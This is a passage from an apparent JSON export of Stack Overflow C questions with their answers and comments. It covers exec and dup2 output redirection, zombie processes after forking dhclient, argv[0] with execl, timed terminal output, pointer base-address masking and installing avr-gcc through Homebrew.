"<p>Using <code>programname&gt;outputfile</code> is a feature of the shell. The shell opens the output file for you and duplicates the file descriptor to <code>1</code> (<code>stdout</code>).</p>\n\n<p>If you don't want to run a shell you can do it like your input redirection with <code>open</code> and <code>dup2</code> before calling <code>exec*</code>. Try something like this:</p>\n\n<pre><code>int fdOut = open(\"output.txt\", O_WRONLY | O_CREAT);\n/* don't forget to check fdOut for error indication */\nint rc = dup2(fdOut, 1);\n/* also check the return code for errors here */\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 10767227, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1797a7748ffd766805ff9456379c969?s=128&d=identicon&r=PG&f=1", "display_name": "ashly", "link": "https://stackoverflow.com/users/10767227/ashly"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 551, "favorite_count": 0, "accepted_answer_id": 53743809, "answer_count": 1, "score": -1, "last_activity_date": 1557057157, "creation_date": 1544618660, "last_edit_date": 1557057157, "question_id": 53743311, "link": "https://stackoverflow.com/questions/53743311/use-execvp-with-input-file-to-a-program-and-redirection-output-to-a-new-file", "title": "Use execvp with Input file to a program and redirection output to a new file", "body": "<p>I did tried to use <a href=\"https://stackoverflow.com/questions/23322269/using-execvp-with-input-output-and-redirection\">this</a> and <a href=\"https://stackoverflow.com/questions/33345025/how-to-save-execvp-output\">this</a> but couldn't make it right (please notice the links before referring to it as a possible duplicate).</p>\n\n<p>In my program I'm trying to run a program using a text file as it's input and redirecting the output of the program to a new file.</p>\n\n<p>Here is my code :</p>\n\n<pre><code>if (fork() == 0) {\n    char *args[]={\"program\",\"&gt;\",\"output.txt\",NULL}; \n    int fd = open(\"/input.txt\", O_RDONLY);\n    dup2(fd, 0);\n    execvp(\"program\",args);\n\n    return 0;\n}\n</code></pre>\n\n<p><code>program.c</code> is my program I'm trying to run(not my main program)\n<code>/input.txt</code> is the file I want to use as an input to my <code>program.c</code>\nand <code>output.txt</code> is the file I want to redirect the output of program to\nI know that for redirecting my program output I should use <code>programname&gt;outputfile</code>.</p>\n\n<p>But I can't make it work, I thing maybe I'm doing something wrong with the <code>args array</code>. What is the right way to sent <code>input.txt</code> as the input for <code>program.c</code> and redirect it's output to <code>output.txt</code>? (note that my main program is  not <code>program.c</code>)</p>\n\n<p>Any help would be appreciated</p>\n"}, {"tags": ["c", "signals", "fork", "exec"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544752191, "post_id": 53743277, "comment_id": 94396752, "body": "when asking a question about a run time problem, as this question is doing. please post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> so we can recreate the problem so we can help you debug, it"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544752351, "post_id": 53743277, "comment_id": 94396798, "body": "the <code>exec*()</code> functions do NOT return unless and error occurred in starting the child process.  So the returned value can/should be totally ignored and follow the call with <code>perror( &quot;execlp failed&quot; ); exit( EXIT_FAILURE );</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544752521, "post_id": 53743277, "comment_id": 94396826, "body": "OT: regarding <code>if (child &lt; 0)         {                return 0;</code>  when an error occurs the next two statements should be: <code>perror( &quot;fork failed&quot; );  exit( EXIT_FAILURE );</code>  Note a returned value of 0 (typically) indicates success, but. in reality,  the application has failed"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 6701922, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/40351b6b8046241b13b199b4ed531477?s=128&d=identicon&r=PG&f=1", "display_name": "Syed Towkhir", "link": "https://stackoverflow.com/users/6701922/syed-towkhir"}, "edited": false, "score": 0, "creation_date": 1544666951, "post_id": 53744382, "comment_id": 94360825, "body": "Thanks bodo, that helped. But I have a followup question. Since the dhclient is runnig in a daemon mode. it gets separated from the parent which means I do not have control over it anymore as it has it own process group. Is there a way to fix it and have the control over it all the time?"}, {"owner": {"reputation": 6679, "user_id": 10622916, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21bd4eeaa5ba60dc021c5ccfbf4a963d?s=128&d=identicon&r=PG&f=1", "display_name": "Bodo", "link": "https://stackoverflow.com/users/10622916/bodo"}, "reply_to_user": {"reputation": 3, "user_id": 6701922, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/40351b6b8046241b13b199b4ed531477?s=128&d=identicon&r=PG&f=1", "display_name": "Syed Towkhir", "link": "https://stackoverflow.com/users/6701922/syed-towkhir"}, "edited": false, "score": 0, "creation_date": 1544710602, "post_id": 53744382, "comment_id": 94379280, "body": "@SyedTowkhir What exactly do you want to do with the <code>dhclient</code> process? Why do you implement this as a C program? I think a shell script would be sufficient. If you don&#39;t want <code>dhclient</code> to run as a daemon you might omit the <code>-nw</code> option and add <code>-d</code> (Force dhclient to run as a foreground process.) if your <code>dhclient</code> supports this. (read <code>man dhclient</code>) You instruct <code>dhclient</code> to write its PID to a file. You can use the PID from the file to kill it instead of parsing the output of <code>ps</code>. <code>kill -9</code> should be used only if nothing else works. A killed program cannot save state or clean up."}, {"owner": {"reputation": 3, "user_id": 6701922, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/40351b6b8046241b13b199b4ed531477?s=128&d=identicon&r=PG&f=1", "display_name": "Syed Towkhir", "link": "https://stackoverflow.com/users/6701922/syed-towkhir"}, "edited": false, "score": 0, "creation_date": 1544769822, "post_id": 53744382, "comment_id": 94400581, "body": "I agree its a crude way. I will modify to use the pid file instead."}], "tags": [], "owner": {"reputation": 6679, "user_id": 10622916, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21bd4eeaa5ba60dc021c5ccfbf4a963d?s=128&d=identicon&r=PG&f=1", "display_name": "Bodo", "link": "https://stackoverflow.com/users/10622916/bodo"}, "is_accepted": true, "score": 0, "last_activity_date": 1544622150, "creation_date": 1544622150, "answer_id": 53744382, "question_id": 53743277, "link": "https://stackoverflow.com/questions/53743277/forking-and-running-dhclient-with-params-nw-w-in-exec-creates-a-defunct-proc/53744382#53744382", "title": "Forking and running dhclient (with params -nw -w) in exec creates a defunct process and a daemon process", "body": "<p>The zombie process <code>31298</code> exists as long as the parent process did not yet wait for it, so probably there is something wrong with your process table or your <code>waitpid</code> call.\nI cannot check because your code is incomplete.</p>\n\n<p>Instead of waiting for a specific PID you could also wait for any child or for a process group and find out from the resultuing <code>siginfo_t</code> structure which process just reported its state change.</p>\n\n<p>I don't know which string you assign with</p>\n\n<pre><code>char *const argV[] = {commands[idx].cmd[0],\n/* ... */\n</code></pre>\n\n<p><code>argv[0]</code> should be the file name of the program, i.e. the same as <code>WAN_EXECUTABLE</code></p>\n"}], "owner": {"reputation": 3, "user_id": 6701922, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/40351b6b8046241b13b199b4ed531477?s=128&d=identicon&r=PG&f=1", "display_name": "Syed Towkhir", "link": "https://stackoverflow.com/users/6701922/syed-towkhir"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 53744382, "answer_count": 1, "score": 0, "last_activity_date": 1544622150, "creation_date": 1544618553, "question_id": 53743277, "link": "https://stackoverflow.com/questions/53743277/forking-and-running-dhclient-with-params-nw-w-in-exec-creates-a-defunct-proc", "title": "Forking and running dhclient (with params -nw -w) in exec creates a defunct process and a daemon process", "body": "<p>I am seeing a zombie process and the dhclient process when I fork from my parent process and then exec the dhclient process with its arguments</p>\n\n<p>Here is the output </p>\n\n<pre><code>root     31298  0.0  0.0      0     0 pts/2    Z    09:22   0:00 [dhclientForData] &lt;defunct&gt;\nroot     31410  0.0  0.0  24260  9108 ?        Ss   09:23   0:00 -nw -w -sf etc/dhclient-script -pf /var/run/dhclient-vEth0.pid -lf /var/lib/dhcp/dhclient-vEth0.leases -cf /etc/sysconfig/dhclient.conf vEth0\n</code></pre>\n\n<p>I have renamed the linux system dhclient to dhclientForData in my parent process. Notice the second line in the above output I dont see the dhclient process name just the argurmnts I am not sure why, anyone?</p>\n\n<p>my code </p>\n\n<pre><code>func_parent()\n{\n       pid_t child = 0;\n        child = fork();\n        if (child &lt; 0)\n        {   \n            return 0;\n        }\n        if (child == 0)\n        {   \n            wanIntfDhclientHandlerProcessChildAdd ();\n        }\n        shmWlanTunMonitrConfig-&gt;childProcs[index].procId = child;\n        sleep(1);\n    }\n\n    uint8_t wanIntfDhclientHandlerProcessChildAdd ()\n    {\n        pid_t mypid = getpid();\n        uint8_t idx = gindex;\n        //for (; idx &lt; MAX_WAN_PORTS; idx++)\n        {   \n            if (!shmWlanTunMonitrConfig-&gt;childProcs[idx].isRunning &amp;&amp; shmWlanTunMonitrConfig-&gt;childProcs[idx].cmdIdx != 0xFF)\n            {   \n                shmWlanTunMonitrConfig-&gt;childProcs[idx].isRunning = 1;\n\n                char *const argV[] = {commands[idx].cmd[0],\n                commands[idx].cmd[1],\n                commands[idx].cmd[2],\n                commands[idx].cmd[3],\n                commands[idx].cmd[4],\n                commands[idx].cmd[5],\n                commands[idx].cmd[6],\n                commands[idx].cmd[7],\n                commands[idx].cmd[8],\n                commands[idx].cmd[9],\n                commands[idx].cmd[10],\n                NULL};\n                int ret = execvp(WAN_EXECUTABLE, argV);\n    }\n    }\n    }\n</code></pre>\n\n<p>I have registered to the sigchld and will waitpid on that process. I have multiple processes running</p>\n\n<pre><code>pid_t pid = waitpid(shmWlanTunMonitrConfig-&gt;childProcs[index].procId, &amp;status, WNOHANG);\n</code></pre>\n\n<p>I just delete the process from my parent process if the job is no longer required.</p>\n\n<pre><code>char cmd[512] = {0};\nsprintf(cmd, \"for KILLPID in `ps ax | grep \\'/var/run/dhclient\\' | grep \\'%s\\' | awk \\' { print $1;}\\'`; do kill -9 $KILLPID; done\", portIntfAr[index].intfName);\nsystem (cmd);\n</code></pre>\n\n<p>Can anyone please point me at what am I doing wrong.</p>\n\n<p>Syed</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1544618124, "post_id": 53743101, "comment_id": 94338865, "body": "Have you <i><a href=\"https://stackoverflow.com/questions/6312597/is-inline-without-static-or-extern-ever-useful-in-c99\">seen/read this</a></i>?"}, {"owner": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 0, "creation_date": 1544618580, "post_id": 53743101, "comment_id": 94339102, "body": "Linkers in general do a lousy job of picking the &quot;right&quot; inline version if they have to choose.  All that the compiler does is emit an attribute that instructs the linker to just pick one of them and ignore the rest.  Ideally the linker generate a diagnostic when the other ones don&#39;t have the same code body, but that ideal is hard to come by.  So this can go as horribly wrong as you can imagine."}], "owner": {"reputation": 1, "user_id": 10780848, "user_type": "registered", "profile_image": "https://graph.facebook.com/1957234277659494/picture?type=large", "display_name": "Ayush Bajpai", "link": "https://stackoverflow.com/users/10780848/ayush-bajpai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 41, "favorite_count": 0, "closed_date": 1544618433, "answer_count": 0, "score": 0, "last_activity_date": 1544617937, "creation_date": 1544617937, "question_id": 53743101, "link": "https://stackoverflow.com/questions/53743101/why-it-is-dangerous-to-declare-a-inline-function-without-static-keyword-misra", "closed_reason": "Duplicate", "title": "Why it is dangerous to declare a inline function without static keyword. (MISRA rule 8.10)", "body": "<p>Why it is not standardised to declare a inline function without static storage class according to MISRA rule 8.10</p>\n"}, {"tags": ["c", "unix", "command-line", "exec"], "comments": [{"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1544618031, "post_id": 53742928, "comment_id": 94338808, "body": "&quot;Should be&quot; does not mean &quot;MUST BE&quot; or &quot;IS&quot;. You can decide to do differently  which is not encouraged. But this also means whatever you decide, you have to do it accordingly. No one does it for you. Just add the missing string to your parameter list."}, {"owner": {"reputation": 31251, "user_id": 4162356, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/dGhuV.png?s=128&g=1", "display_name": "James Brown", "link": "https://stackoverflow.com/users/4162356/james-brown"}, "edited": false, "score": 1, "creation_date": 1544619592, "post_id": 53742928, "comment_id": 94339685, "body": "See <code>man execve</code> and the examples, especially the second one (<code>execve.c</code>)."}], "owner": {"user_type": "does_not_exist", "display_name": "user2201041"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 37, "favorite_count": 0, "closed_date": 1544618120, "answer_count": 0, "score": 2, "last_activity_date": 1544617277, "creation_date": 1544617277, "question_id": 53742928, "link": "https://stackoverflow.com/questions/53742928/why-isnt-argv0-being-set-to-the-program-name-when-calling-with-exec", "closed_reason": "Duplicate", "title": "Why isn&#39;t argv[0] being set to the program name when calling with exec?", "body": "<p>I have a sample program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main(int argc, char *argv[])\n{\n    for (int arg = 0; arg &lt; argc; ++arg)\n    {\n        printf(\"%s\\n\", argv[arg]);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>When I compile and run, it behaves as I expect:</p>\n\n<pre><code>&gt;&gt;&gt; gcc callee.c -std=c99 -o callee\n&gt;&gt;&gt; ./callee foo bar baz quux\n./callee\nfoo\nbar\nbaz\nquux\n</code></pre>\n\n<p>But now I want to call it from a different program:</p>\n\n<pre><code>#include &lt;unistd.h&gt;\nint main(int argc, char *argv[])\n{\n    execl(\"callee\", \"foo\", \"bar\", \"baz\", \"quux\", (char *)NULL);\n    return 0;\n}\n</code></pre>\n\n<p>And the program name isn't passed to argv[0] anymore!</p>\n\n<pre><code>&gt;&gt;&gt; gcc -std=c99 caller.c -o caller\n&gt;&gt;&gt; ./caller\nfoo\nbar\nbaz\nquux\n</code></pre>\n\n<p>I suppose I can get my desired behavior by passing the program name a second time when calling <code>execl</code>, but I'm concerned whether that's the right way to do it.</p>\n\n<p><a href=\"http://man7.org/linux/man-pages/man3/exec.3.html\" rel=\"nofollow noreferrer\"><code>man exec</code></a> just says \"The first argument, by convention, should point to the filename associated with the file being executed,\" which seems to support my attempt, so I'm not sure what I'm missing.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544617032, "post_id": 53742745, "comment_id": 94338270, "body": "It&#39;s not possible with standard C. The best you can hope for is to print backspaces. You should use some non-standard library or API for this."}, {"owner": {"reputation": 330, "user_id": 8504592, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/A0lBH.jpg?s=128&g=1", "display_name": "PunyCode", "link": "https://stackoverflow.com/users/8504592/punycode"}, "edited": false, "score": 0, "creation_date": 1544617249, "post_id": 53742745, "comment_id": 94338389, "body": "if you are using ANSI, printf-ing (<code>\\033[2J</code>) this character might work."}, {"owner": {"reputation": 989, "user_id": 5016244, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bdZPE.jpg?s=128&g=1", "display_name": "Theophile Dano", "link": "https://stackoverflow.com/users/5016244/theophile-dano"}, "edited": false, "score": 0, "creation_date": 1544617494, "post_id": 53742745, "comment_id": 94338521, "body": "you could alternatively use ncurses library. But I would advice against since you&#39;re a beginner, so you say"}], "answers": [{"comments": [{"owner": {"reputation": 698, "user_id": 1303934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/J1P18.jpg?s=128&g=1", "display_name": "risingDarkness", "link": "https://stackoverflow.com/users/1303934/risingdarkness"}, "edited": false, "score": 0, "creation_date": 1544617019, "post_id": 53742797, "comment_id": 94338262, "body": "Another workaround may be to flood newlines until it&#39;s out of the buffer, but that&#39;s still terrible."}], "tags": [], "owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "is_accepted": false, "score": 4, "last_activity_date": 1544616808, "creation_date": 1544616808, "answer_id": 53742797, "question_id": 53742745, "link": "https://stackoverflow.com/questions/53742745/is-it-possible-to-display-a-printf-statement-for-a-limited-amount-of-time-n-c/53742797#53742797", "title": "Is it possible to display a printf() statement for a limited amount of time n c?", "body": "<p>Terminals are, by default, designed to emit progressively more and more lines of text in a buffer. Text gets added to the end, and previous lines remain visible (up to the limit of the terminal's configured buffer size).</p>\n\n<p>It is possible to get more of a \"GUI\" feel by changing terminal modes, and this is usually done using a library like <em>curses</em> or <em>ncurses</em>. This will permit you to show text at specific parts of the window, and remove said text. Upon ending the program, <em>curses</em> \"resets\" the terminal such that the whole \"GUI\" disappears (although some terminals will still show the user the \"final state\" of the GUI if they scroll up a page).</p>\n\n<p>A code example would be a tutorial on how to use <em>ncurses</em>, which is a bit too broad for this medium, but not difficult to find.</p>\n\n<p>Since you're on a beginner course, it's likely that you are being encouraged to do the next best thing, which is either:</p>\n\n<ol>\n<li>\"Faking\" disappearing text by streaming a carriage return then overwriting the old line with spaces or replacement text (support for this effect varies), or</li>\n<li>\"Faking\" disappearing text by streaming backspace characters (support for this effect varies), or</li>\n<li>Not doing it at all but instead just moving on to the next line</li>\n</ol>\n\n<p>In all cases described above except for #3, the responsibility of implementing a \"timer\" shall be yours.</p>\n"}, {"comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 1, "creation_date": 1544755228, "post_id": 53742881, "comment_id": 94397370, "body": "not all OSs &#39;only&#39; return the cursor to the beginning of the line when a <code>&#39;\\r</code> is output"}], "tags": [], "owner": {"reputation": 3128, "user_id": 2899520, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9d046c85ed155fb3e964d9dd4c43842a?s=128&d=identicon&r=PG&f=1", "display_name": "LearningC", "link": "https://stackoverflow.com/users/2899520/learningc"}, "is_accepted": false, "score": -1, "last_activity_date": 1544617118, "creation_date": 1544617118, "answer_id": 53742881, "question_id": 53742745, "link": "https://stackoverflow.com/questions/53742745/is-it-possible-to-display-a-printf-statement-for-a-limited-amount-of-time-n-c/53742881#53742881", "title": "Is it possible to display a printf() statement for a limited amount of time n c?", "body": "<p>you can use <code>\\r</code> to take the print cursor to begining of line. so you can replace that content to achieve the effect of deleting the content after sometime</p>\n"}, {"comments": [{"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1544620122, "post_id": 53743028, "comment_id": 94339980, "body": "Why the dynamic allocation and string building? Why not just <code>putc(&#39;\\b&#39;)</code> <code>strlen(string)</code> times? Also you&#39;re overcalculating <code>strlen(string)</code>."}, {"owner": {"reputation": 1732, "user_id": 9994983, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/932949dc143ce7e96b7f4704594c9e84?s=128&d=identicon&r=PG&f=1", "display_name": "Alex G", "link": "https://stackoverflow.com/users/9994983/alex-g"}, "reply_to_user": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1544620430, "post_id": 53743028, "comment_id": 94340129, "body": "@LightnessRacesinOrbit Not a particular reason, it&#39;s just a way of doing this. I didn&#39;t think of putc to be honest. I suppose your way is better and safer."}], "tags": [], "owner": {"reputation": 1732, "user_id": 9994983, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/932949dc143ce7e96b7f4704594c9e84?s=128&d=identicon&r=PG&f=1", "display_name": "Alex G", "link": "https://stackoverflow.com/users/9994983/alex-g"}, "is_accepted": false, "score": 0, "last_activity_date": 1544617616, "creation_date": 1544617616, "answer_id": 53743028, "question_id": 53742745, "link": "https://stackoverflow.com/questions/53742745/is-it-possible-to-display-a-printf-statement-for-a-limited-amount-of-time-n-c/53743028#53743028", "title": "Is it possible to display a printf() statement for a limited amount of time n c?", "body": "<p>You could print backspaces to delete the text you just displayed. Like this: </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n\n    char * string = \"Hello\";\n\n    printf(\"%s\", string);\n\n    fflush(stdout);\n\n    sleep(1);\n\n    char * backspaces = malloc(strlen(string) * sizeof(char));\n\n    for (int i = 0 ; i &lt; strlen(string) ; i++) backspaces[i] = '\\b';\n\n    printf(\"%s\", backspaces);\n}\n</code></pre>\n\n<p>And for the limited time valid input you could use <a href=\"http://man7.org/linux/man-pages/man2/gettimeofday.2.html\" rel=\"nofollow noreferrer\">gettimeofday</a> to check if input is within time or not.</p>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1544755341, "creation_date": 1544755341, "answer_id": 53772834, "question_id": 53742745, "link": "https://stackoverflow.com/questions/53742745/is-it-possible-to-display-a-printf-statement-for-a-limited-amount-of-time-n-c/53772834#53772834", "title": "Is it possible to display a printf() statement for a limited amount of time n c?", "body": "<p>use the ANSI escape commands to 1) remember where the cursor currently is located 2) printf the line (and remember the returned value from <code>printf()</code>  3) start a timer (for instance using <code>alarm()</code>) when the timer/alarm expires a signal will be raised.  Use the signal to flag the event, then in the main code:  if signalflag asserted, use ANSI escape sequence to move the cursor to the saved/remembered position, then write space data for the length returned from the original <code>printf()</code>.  Then restore the cursor</p>\n"}], "owner": {"reputation": 11, "user_id": 10675585, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-x9WQ8n69-b8/AAAAAAAAAAI/AAAAAAAAABQ/E3zBJKtT0G4/photo.jpg?sz=128", "display_name": "Clara", "link": "https://stackoverflow.com/users/10675585/clara"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 88, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1544755341, "creation_date": 1544616626, "last_edit_date": 1544617294, "question_id": 53742745, "link": "https://stackoverflow.com/questions/53742745/is-it-possible-to-display-a-printf-statement-for-a-limited-amount-of-time-n-c", "title": "Is it possible to display a printf() statement for a limited amount of time n c?", "body": "<p>I'm a beginner at coding and I was instructed to code a text-based game so <strong>I am trying to figure out whether it's possible to print out a statement for a limited time only in C</strong> and <strong>is it also possible to let them input an answer for a limited time as well</strong>? The problem is if I print out something, they could scroll up and that's what I'm trying to avoid. If it is possible, please do enter the code or resources that I may use for reference below. Thank you.</p>\n"}, {"tags": ["c", "pointers"], "answers": [{"tags": [], "owner": {"reputation": 783, "user_id": 4627040, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/z3WkC.jpg?s=128&g=1", "display_name": "Saeed Hassanvand", "link": "https://stackoverflow.com/users/4627040/saeed-hassanvand"}, "is_accepted": true, "score": 2, "last_activity_date": 1545031733, "creation_date": 1545031733, "answer_id": 53810628, "question_id": 53742717, "link": "https://stackoverflow.com/questions/53742717/how-i-can-calculate-a-pointer-base-address-in-c/53810628#53810628", "title": "How I can calculate a pointer base address in C", "body": "<p><strong>Prerequisites:</strong></p>\n\n<p>This instruction:</p>\n\n<pre><code>size = 1 &lt;&lt; e;\n</code></pre>\n\n<p>Means shifting 1, e bit to the left that is equivalent to <code>1 * (2^e)</code>.</p>\n\n<p>In this instruction:</p>\n\n<pre><code>base = p &amp; \u02dc(size-1);\n</code></pre>\n\n<p><code>p &amp; \u02dc(size-1)</code> means doing binary and (&amp;) between p and the unary complement of size (<code>(size-1)</code>).</p>\n\n<p><strong>Example:</strong></p>\n\n<pre><code>allocation space\n------------\n|          | 0001 1111\n------------\n|     .    |\n|     .    |\n|     .    |\n------------\n|          | p = 0001 0100\n------------\n|     .    |\n|     .    |\n|     .    |\n------------\n|          | 0001 0000\n------------\n\ne = log(16) = 4\n\nsize = 1 &lt;&lt; 4 = 0001 0000\n\nsize - 1 = 0000 1111\n\n~(size -1) = 1111 0000\n\nbase = 0001 0100 &amp; 1111 0000 = 0001 0000\n</code></pre>\n"}], "owner": {"reputation": 81, "user_id": 6197056, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3726f34131f68ffc924ae5430da31695?s=128&d=identicon&r=PG&f=1", "display_name": "Elham Esmaeeli", "link": "https://stackoverflow.com/users/6197056/elham-esmaeeli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 401, "favorite_count": 0, "accepted_answer_id": 53810628, "answer_count": 1, "score": 1, "last_activity_date": 1545031733, "creation_date": 1544616519, "last_edit_date": 1544619086, "question_id": 53742717, "link": "https://stackoverflow.com/questions/53742717/how-i-can-calculate-a-pointer-base-address-in-c", "title": "How I can calculate a pointer base address in C", "body": "<p>I have a pointer like below:</p>\n\n<pre><code>char *p=malloc(94)\n</code></pre>\n\n<p>After a lot of search around base pointer address calculation, I find this solution:</p>\n\n<pre><code>e = log(size)\n\nsize = 1 &lt;&lt; e\n\nbase = p &amp; \u02dc(size-1);\n</code></pre>\n\n<p>How does this formula work? Can anybody explain this solution?</p>\n"}, {"tags": ["c", "gcc", "embedded", "avr"], "comments": [{"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 5, "creation_date": 1544615413, "post_id": 53742369, "comment_id": 94337285, "body": "You&#39;re supposed to run <code>brew install avr-gcc</code>"}, {"owner": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "edited": false, "score": 1, "creation_date": 1544642406, "post_id": 53742369, "comment_id": 94352534, "body": "Also while roundabout it&#39;s worth keeping in mind that you get an avr toolchain if you install the Arduino setup; though it will be in some odd place you have to find before you can use it independently."}], "answers": [{"tags": [], "owner": {"reputation": 2765, "user_id": 2205264, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HwuNJ.jpg?s=128&g=1", "display_name": "ladislas", "link": "https://stackoverflow.com/users/2205264/ladislas"}, "is_accepted": false, "score": 1, "last_activity_date": 1569511683, "creation_date": 1569511683, "answer_id": 58120132, "question_id": 53742369, "link": "https://stackoverflow.com/questions/53742369/using-brew-install-avr-libc-command-on-mac-produces-error-no-formulae-found-i/58120132#58120132", "title": "using &#39;brew install avr-libc&#39; command on Mac produces error &#39;no formulae found in taps&#39;", "body": "<p>as @nos said, you need to run <code>brew install avr-gcc</code>.</p>\n\n<p>More info here: <a href=\"https://github.com/osx-cross/homebrew-avr#installing-homebrew-avr-formulae\" rel=\"nofollow noreferrer\">https://github.com/osx-cross/homebrew-avr#installing-homebrew-avr-formulae</a></p>\n"}, {"tags": [], "owner": {"reputation": 31, "user_id": 13931755, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-2ffQmtdPktI/AAAAAAAAAAI/AAAAAAAAAAc/klIjR_u66Ew/photo.jpg?sz=128", "display_name": "DextersLab", "link": "https://stackoverflow.com/users/13931755/dexterslab"}, "is_accepted": false, "score": 0, "last_activity_date": 1594761058, "creation_date": 1594761058, "answer_id": 62904070, "question_id": 53742369, "link": "https://stackoverflow.com/questions/53742369/using-brew-install-avr-libc-command-on-mac-produces-error-no-formulae-found-i/62904070#62904070", "title": "using &#39;brew install avr-libc&#39; command on Mac produces error &#39;no formulae found in taps&#39;", "body": "<p>This worked for me: <code>brew tap osx-cross/avr &amp;&amp; brew install avr-gcc</code></p>\n<p>Needed to expand brew's options of available software, as well as reference the updated avr-gcc instead of avr-libc.</p>\n"}], "owner": {"reputation": 111, "user_id": 6210842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0076b65939eb5375d195f36a9f053b23?s=128&d=identicon&r=PG&f=1", "display_name": "Toby Blunt", 